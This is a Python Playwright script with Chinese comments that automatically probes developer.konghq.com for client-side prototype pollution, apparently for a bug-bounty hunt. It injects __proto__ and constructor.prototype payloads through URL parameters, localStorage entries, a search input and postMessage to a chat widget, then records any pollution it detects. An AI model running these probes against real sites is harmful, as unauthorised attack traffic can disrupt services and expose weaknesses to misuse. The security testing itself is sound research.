#!/usr/bin/env python3
"""
原型污染自动化测试 - 完全无需手动操作
使用浏览器自动化执行所有测试
"""
import asyncio
from playwright.async_api import async_playwright
import json
import time

BASE_URL = 'https://developer.konghq.com'

async def test_prototype_pollution():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context()
        page = await context.new_page()
        
        results = []
        
        # ========== 测试1: URL参数注入 ==========
        print("="*80)
        print("测试1: URL参数注入")
        print("="*80)
        
        test_payloads = [
            '/plugins/?filter[__proto__][test]=123',
            '/plugins/?search[__proto__][admin]=true',
            '/?q[__proto__][xss]=test',
            '/?__proto__[polluted]=yes',
        ]
        
        for payload in test_payloads:
            url = BASE_URL + payload
            print(f"\n[测试] {url}")
            
            await page.goto(url, wait_until='networkidle')
            
            # 检查是否被污染
            polluted = await page.evaluate('''() => {
                return {
                    test: {}.test,
                    polluted: {}.polluted,
                    admin: {}.isAdmin,
                    xss: {}.xss
                };
            }''')
            
            found = any(v is not None for v in polluted.values())
            print(f"  结果: {'🔴 发现污染!' if found else '❌ 未污染'}")
            print(f"  值: {polluted}")
            
            if found:
                results.append({
                    'test': 'URL参数注入',
                    'payload': payload,
                    'result': 'SUCCESS',
                    'evidence': polluted
                })
        
        # ========== 测试2: LocalStorage注入 ==========
        print("\n" + "="*80)
        print("测试2: LocalStorage注入")
        print("="*80)
        
        await page.goto(BASE_URL + '/plugins/', wait_until='networkidle')
        
        localStorage_payloads = [
            ('kapa-config', json.dumps({'__proto__': {'test': 123}})),
            ('__proto__', json.dumps({'polluted': True})),
            ('config', json.dumps({'constructor': {'prototype': {'x': 1}}})),
        ]
        
        for key, value in localStorage_payloads:
            print(f"\n[测试] localStorage.{key} = {value}")
            
            await page.evaluate(f'''(key, value) => {{
                localStorage.setItem(key, value);
            }}''', key, value)
            
            # 刷新页面触发可能的合并
            await page.reload(wait_until='networkidle')
            
            polluted = await page.evaluate('''() => {
                return {
                    test: {}.test,
                    x: {}.x
                };
            }''')
            
            found = any(v is not None for v in polluted.values())
            print(f"  结果: {'🔴 发现污染!' if found else '❌ 未污染'}")
            print(f"  值: {polluted}")
            
            if found:
                results.append({
                    'test': 'LocalStorage注入',
                    'payload': key,
                    'result': 'SUCCESS',
                    'evidence': polluted
                })
            
            # 清理
            await page.evaluate(f'localStorage.removeItem("{key}")')
        
        # ========== 测试3: 输入框注入 ==========
        print("\n" + "="*80)
        print("测试3: 输入框注入")
        print("="*80)
        
        await page.goto(BASE_URL + '/plugins/', wait_until='networkidle')
        
        # 查找输入框
        inputs = await page.query_selector_all('input[type="text"], input[type="search"], input:not([type])')
        print(f"\n找到 {len(inputs)} 个输入框")
        
        if inputs:
            payload = '{"__proto__":{"injected":true}}'
            print(f"[测试] 在第一个输入框注入: {payload}")
            
            await inputs[0].fill(payload)
            await inputs[0].press('Enter')
            await page.wait_for_timeout(2000)
            
            polluted = await page.evaluate('''() => {
                return {
                    injected: {}.injected
                };
            }''')
            
            found = polluted.get('injected') is not None
            print(f"  结果: {'🔴 发现污染!' if found else '❌ 未污染'}")
            print(f"  值: {polluted}")
            
            if found:
                results.append({
                    'test': '输入框注入',
                    'payload': payload,
                    'result': 'SUCCESS',
                    'evidence': polluted
                })
        
        # ========== 测试4: kapa widget postMessage ==========
        print("\n" + "="*80)
        print("测试4: kapa widget postMessage")
        print("="*80)
        
        await page.goto(BASE_URL, wait_until='networkidle')
        
        postMessage_payloads = [
            {'__proto__': {'polluted': True}},
            {'constructor': {'prototype': {'test': 123}}},
        ]
        
        for i, payload in enumerate(postMessage_payloads):
            print(f"\n[测试] postMessage payload #{i+1}")
            
            await page.evaluate('''(payload) => {
                window.postMessage({
                    type: 'kapa-message',
                    data: JSON.stringify(payload)
                }, '*');
            }''', payload)
            
            await page.wait_for_timeout(3000)
            
            polluted = await page.evaluate('''() => {
                return {
                    polluted: {}.polluted,
                    test: {}.test
                };
            }''')
            
            found = any(v is not None for v in polluted.values())
            print(f"  结果: {'🔴 发现污染!' if found else '❌ 未污染'}")
            print(f"  值: {polluted}")
            
            if found:
                results.append({
                    'test': 'postMessage注入',
                    'payload': str(payload),
                    'result': 'SUCCESS',
                    'evidence': polluted
                })
        
        # ========== 生成报告 ==========
        print("\n" + "="*80)
        print("📊 测试报告")
        print("="*80)
        
        print(f"\n总测试数: {len(results)}")
        success = [r for r in results if r['result'] == 'SUCCESS']
        print(f"成功: {len(success)}")
        print(f"失败: {len(results) - len(success)}")
        
        if success:
            print("\n🔴 发现的漏洞:")
            for i, result in enumerate(success, 1):
                print(f"\n  [{i}] {result['test']}")
                print(f"      Payload: {result['payload']}")
                print(f"      证据: {result['evidence']}")
            
            print("\n" + "="*80)
            print("🎉 恭喜！发现了原型污染漏洞！")
            print("="*80)
        else:
            print("\n✅ 未发现原型污染漏洞")
            print("\n可能的原因:")
            print("  1. 网站是纯静态的，没有后端合并逻辑")
            print("  2. JavaScript代码虽然包含__proto__，但无法从用户输入到达")
            print("  3. 有防护机制阻止了污染")
            print("\n建议:")
            print("  • 这可能只是代码质量问题，不是安全漏洞")
            print("  • 不符合Kong的漏洞赏金要求")
            print("  • 建议放弃或转向其他测试方向")
        
        # 保存结果
        with open('prototype_pollution_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n详细结果已保存到: prototype_pollution_results.json")
        
        await browser.close()

if __name__ == '__main__':
    asyncio.run(test_prototype_pollution())
